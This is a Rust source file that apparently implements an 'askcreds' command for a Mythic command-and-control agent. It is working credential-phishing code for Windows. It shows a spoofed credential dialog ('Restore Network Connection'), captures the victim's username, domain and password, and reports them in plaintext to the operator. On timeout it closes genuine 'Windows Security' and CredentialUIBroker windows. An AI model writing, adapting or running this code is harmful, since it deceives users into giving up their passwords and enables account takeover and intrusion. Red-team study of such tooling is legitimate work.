use std::ffi::{OsStr, OsString};
use std::os::windows::ffi::{OsStrExt, OsStringExt};
use std::ptr;
use std::thread;
use std::time::Duration;
use serde::{Deserialize, Serialize};
use crate::{AgentTask, mythic_success, mythic_error};
use crate::agent::AskCredsArgs;

#[cfg(target_os = "windows")]
use winapi::ctypes::c_void;
#[cfg(target_os = "windows")]
use winapi::um::wincred::*;
#[cfg(target_os = "windows")]
use winapi::um::winuser::*;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::*;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::*;
#[cfg(target_os = "windows")]
use winapi::um::synchapi::*;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::*;
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::{FALSE, TRUE, BOOL, ULONG};

#[cfg(target_os = "windows")]
const TIMEOUT: u32 = 60;
#[cfg(target_os = "windows")]
const DEFAULT_REASON: &str = "Restore Network Connection";
#[cfg(target_os = "windows")]
const MESSAGE: &str = "Please verify your Windows user credentials to proceed.";

#[cfg(target_os = "windows")]
#[derive(Serialize)]
pub struct CredentialResult {
    pub success: bool,
    pub username: Option<String>,
    pub domain: Option<String>,
    pub password: Option<String>,
    pub error: Option<String>,
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn enum_windows_proc(hwnd: HWND, _lparam: LPARAM) -> BOOL {
    let mut window_title = [0i8; 1024];
    let mut proc_id: DWORD = 0;

    if hwnd.is_null() {
        return TRUE;
    }

    if IsWindowVisible(hwnd) == 0 {
        return TRUE;
    }

    let style = GetWindowLongPtrA(hwnd, GWL_STYLE);
    if GetWindowThreadProcessId(hwnd, &mut proc_id) == 0 {
        return TRUE;
    }

    ptr::write_bytes(window_title.as_mut_ptr(), 0, window_title.len());
    
    if SendMessageA(
        hwnd,
        WM_GETTEXT,
        window_title.len() as WPARAM,
        window_title.as_mut_ptr() as LPARAM,
    ) == 0
    {
        return TRUE;
    }

    let title_str = std::ffi::CStr::from_ptr(window_title.as_ptr()).to_string_lossy();
    
    if title_str.eq_ignore_ascii_case("Windows Security") {
        PostMessageA(hwnd, WM_CLOSE, 0, 0);
    } else if proc_id == GetCurrentProcessId() && (style & WS_POPUPWINDOW) == WS_POPUPWINDOW {
        PostMessageA(hwnd, WM_CLOSE, 0, 0);
    } else {
        let mut file_name = [0u16; 260]; // MAX_PATH
        let mut size = 260 as DWORD;
        
        let h_process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc_id);
        if !h_process.is_null() && h_process != INVALID_HANDLE_VALUE {
            if QueryFullProcessImageNameW(h_process, 0, file_name.as_mut_ptr(), &mut size) != 0 {
                let exe_path = String::from_utf16_lossy(&file_name[..size as usize]);
                if exe_path.to_lowercase().contains("credentialuibroker.exe") {
                    PostMessageA(hwnd, WM_CLOSE, 0, 0);
                }
            }
            CloseHandle(h_process);
        }
    }

    TRUE
}

#[cfg(target_os = "windows")]
fn string_to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

#[cfg(target_os = "windows")]
unsafe fn ask_creds(reason: &str) -> Result<CredentialResult, String> {
    let reason_wide = string_to_wide(reason);
    let message_wide = string_to_wide(MESSAGE);

    let mut cred_ui_info: CREDUI_INFOW = std::mem::zeroed();
    cred_ui_info.cbSize = std::mem::size_of::<CREDUI_INFOW>() as DWORD;
    cred_ui_info.pszCaptionText = reason_wide.as_ptr() as *mut _;
    cred_ui_info.pszMessageText = message_wide.as_ptr() as *mut _;
    cred_ui_info.hbmBanner = ptr::null_mut();
    cred_ui_info.hwndParent = ptr::null_mut();

    let mut username = [0u16; 256];
    let mut username_len = username.len() as ULONG;
    let mut auth_package: ULONG = 0;
    let mut in_cred_buffer: *mut c_void = ptr::null_mut();
    let mut in_cred_size: ULONG = 0;
    let mut out_cred_buffer: *mut c_void = ptr::null_mut();
    let mut out_cred_size: ULONG = 0;
    let mut save: BOOL = FALSE;

    // Get current username and pack credentials
    if GetUserNameW(username.as_mut_ptr(), &mut username_len) != 0 {
        let empty_password = string_to_wide("");
        
        if CredPackAuthenticationBufferW(
            CRED_PACK_GENERIC_CREDENTIALS,
            username.as_mut_ptr(),
            empty_password.as_ptr() as *mut _,
            ptr::null_mut(),
            &mut in_cred_size,
        ) == FALSE
            && GetLastError() == ERROR_INSUFFICIENT_BUFFER
        {
            in_cred_buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_cred_size as usize);
            if !in_cred_buffer.is_null() {
                if CredPackAuthenticationBufferW(
                    CRED_PACK_GENERIC_CREDENTIALS,
                    username.as_mut_ptr(),
                    empty_password.as_ptr() as *mut _,
                    in_cred_buffer as *mut _,
                    &mut in_cred_size,
                ) == FALSE
                {
                    HeapFree(GetProcessHeap(), 0, in_cred_buffer);
                    in_cred_buffer = ptr::null_mut();
                    in_cred_size = 0;
                }
            }
        }
    }

    // Set parent window to foreground window
    let hwnd = GetForegroundWindow();
    if !hwnd.is_null() {
        cred_ui_info.hwndParent = hwnd;
    }

    let result = CredUIPromptForWindowsCredentialsW(
        &cred_ui_info,
        0,
        &mut auth_package,
        in_cred_buffer,
        in_cred_size,
        &mut out_cred_buffer,
        &mut out_cred_size,
        &mut save,
        CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX,
    );

    let mut credential_result = CredentialResult {
        success: false,
        username: None,
        domain: None,
        password: None,
        error: None,
    };

    if result == ERROR_SUCCESS {
        let mut unpacked_username = [0u16; 256];
        let mut unpacked_password = [0u16; 256];
        let mut unpacked_domain = [0u16; 256];
        let mut username_len = (unpacked_username.len() - 1) as DWORD;
        let mut password_len = (unpacked_password.len() - 1) as DWORD;
        let mut domain_len = (unpacked_domain.len() - 1) as DWORD;

        if CredUnPackAuthenticationBufferW(
            0,
            out_cred_buffer,
            out_cred_size,
            unpacked_username.as_mut_ptr(),
            &mut username_len,
            unpacked_domain.as_mut_ptr(),
            &mut domain_len,
            unpacked_password.as_mut_ptr(),
            &mut password_len,
        ) != 0
        {
            let username_str = String::from_utf16_lossy(
                &unpacked_username[..username_len as usize]
            ).trim_end_matches('\0').to_string();
            
            let password_str = String::from_utf16_lossy(
                &unpacked_password[..password_len as usize]
            ).trim_end_matches('\0').to_string();
            
            let domain_str = String::from_utf16_lossy(
                &unpacked_domain[..domain_len as usize]
            ).trim_end_matches('\0').to_string();

            credential_result.success = true;
            credential_result.username = Some(username_str);
            credential_result.password = Some(password_str);
            
            if !domain_str.is_empty() {
                credential_result.domain = Some(domain_str);
            }
        }

        // Clear sensitive data from memory
        ptr::write_bytes(unpacked_username.as_mut_ptr(), 0, unpacked_username.len());
        ptr::write_bytes(unpacked_password.as_mut_ptr(), 0, unpacked_password.len());
        ptr::write_bytes(unpacked_domain.as_mut_ptr(), 0, unpacked_domain.len());
    } else if result == ERROR_CANCELLED {
        credential_result.error = Some("The operation was canceled by the user".to_string());
    } else {
        credential_result.error = Some(format!("CredUIPromptForWindowsCredentialsW failed with error: {}", result));
    }

    // Cleanup
    if !in_cred_buffer.is_null() {
        HeapFree(GetProcessHeap(), 0, in_cred_buffer);
    }
    
    if !out_cred_buffer.is_null() {
        CoTaskMemFree(out_cred_buffer as *mut _);
    }

    if credential_result.success {
        Ok(credential_result)
    } else {
        Err(credential_result.error.unwrap_or_else(|| "Unknown error".to_string()))
    }
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn thread_proc(param: *mut c_void) -> DWORD {
    let reason_ptr = param as *const u8;
    let reason = if !reason_ptr.is_null() {
        let c_str = std::ffi::CStr::from_ptr(reason_ptr as *const i8);
        c_str.to_string_lossy().into_owned()
    } else {
        DEFAULT_REASON.to_string()
    };
    
    // We'll use a channel to communicate the result back
    // For now, we'll just execute and the result will be handled elsewhere
    let _ = ask_creds(&reason);
    0
}

// Main command execution function for Mythic
#[cfg(target_os = "windows")]
pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    // Parse arguments from task parameters
    let args: AskCredsArgs = if task.parameters.is_empty() {
        AskCredsArgs { reason: None }
    } else {
        serde_json::from_str(&task.parameters)?
    };
    
    let reason = args.reason.unwrap_or_else(|| DEFAULT_REASON.to_string());
    
    let result = unsafe {
        // Create a thread for the credential prompt
        let reason_cstring = std::ffi::CString::new(reason.as_str())
            .map_err(|e| format!("Failed to create CString: {}", e))?;
        
        let reason_ptr = reason_cstring.into_raw();
        
        let handle = CreateThread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(thread_proc as unsafe extern "system" fn(*mut c_void) -> DWORD)),
            reason_ptr as *mut c_void,
            0,
            ptr::null_mut(),
        );

        if handle.is_null() {
            // Clean up the CString if thread creation fails
            let _ = std::ffi::CString::from_raw(reason_ptr);
            return Ok(mythic_error!(task.id, "Failed to create thread for credential prompt"));
        }

        let wait_result = WaitForSingleObject(handle, TIMEOUT * 1000);
        
        let credential_result = if wait_result == WAIT_TIMEOUT {
            // Timeout - close credential windows
            if EnumWindows(Some(enum_windows_proc), 0) == 0 {
                // If closing windows failed, terminate thread
                TerminateThread(handle, 0);
            }
            
            // Wait for thread cleanup
            WaitForSingleObject(handle, 2000);
            Ok(mythic_error!(task.id, "Credential prompt timed out"))
        } else {
            // Thread completed, now actually get the credentials
            match ask_creds(&reason) {
                Ok(creds) => {
                    if creds.success {
                        let mut output = format!("[+] Credentials captured successfully!\n[+] Username: {}", 
                            creds.username.unwrap_or_default());
                        
                        if let Some(domain) = creds.domain {
                            output.push_str(&format!("\n[+] Domain: {}", domain));
                        }
                        
                        if let Some(password) = creds.password {
                            output.push_str(&format!("\n[+] Password: {}", password));
                        }
                        
                        Ok(mythic_success!(task.id, output))
                    } else {
                        Ok(mythic_error!(task.id, creds.error.unwrap_or_else(|| "Failed to capture credentials".to_string())))
                    }
                }
                Err(e) => Ok(mythic_error!(task.id, e))
            }
        };

        // Clean up
        CloseHandle(handle);
        let _ = std::ffi::CString::from_raw(reason_ptr);

        credential_result
    };

    result
}

// macOS placeholder implementation
#[cfg(target_os = "macos")]
pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "askcreds command is not implemented for macOS"))
}

// Fallback for other platforms
#[cfg(not(any(target_os = "windows", target_os = "macos")))]
pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "askcreds command is only supported on Windows"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_askcreds_args_parsing() {
        let args = AskCredsArgs { reason: Some("Test Reason".to_string()) };
        assert_eq!(args.reason.unwrap(), "Test Reason");
        
        let default_args = AskCredsArgs { reason: None };
        assert!(default_args.reason.is_none());
    }
}